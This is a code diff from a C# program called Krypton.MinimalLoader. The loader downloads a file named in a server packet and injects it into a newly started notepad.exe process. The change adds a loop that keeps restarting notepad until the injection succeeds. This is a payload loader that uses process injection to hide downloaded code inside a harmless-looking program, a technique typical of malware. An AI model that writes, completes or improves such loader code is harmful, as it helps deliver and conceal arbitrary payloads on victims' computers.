@@ -6,7 +6,6 @@ using Krypton.MinimalLoader.Core.Network;
 using Krypton.MinimalLoader.Core.Security;
 using System;
 using System.Diagnostics;
-using System.IO;
 
 namespace Krypton.MinimalLoader
 {
@@ -58,15 +57,24 @@ namespace Krypton.MinimalLoader
 							var http = HttpComponent.Instance;
 							if (http.Download(packet.TempDownloadString, out string path))
 							{
-								ProcessStartInfo info = new ProcessStartInfo();
-								info.CreateNoWindow = false;
-								info.FileName = "notepad.exe";
-								info.WindowStyle = ProcessWindowStyle.Hidden;
-								info.ErrorDialog = false;
 
-								var process = Process.Start(info);
+								var starter_component = new ProcessStarterComponent();
 								var injection = InjectionComponent.Instance;
-								if (injection.SetupInjection(path, "notepad", process).Inject())
+								while(true)
+								{
+									starter_component.Run("notepad.exe", true);
+									if (injection.SetupInjection(path, "notepad", starter_component.GetProcess()).Inject())
+									{
+										if(starter_component.IsRunned())
+										{
+											break;
+										}
+									}
+
+									starter_component.Stop();
+								}
+
+								if (starter_component.IsRunned())
 								{
 									ChangeColor(ConsoleColor.Green);
 									Console.WriteLine("OK");
@@ -124,6 +132,12 @@ namespace Krypton.MinimalLoader
 			Console.ResetColor();
 			//Task.Delay(3000).GetAwaiter();
 			Console.ReadKey();
+		}
+
+		private static void Process_ErrorDataReceived(object sender, DataReceivedEventArgs e)
+		{
+			//throw new NotImplementedException();
+			//Console.WriteLine($"Error: {e.Data}");
 		}
 
 		private static bool CheckSecurity(out string message)
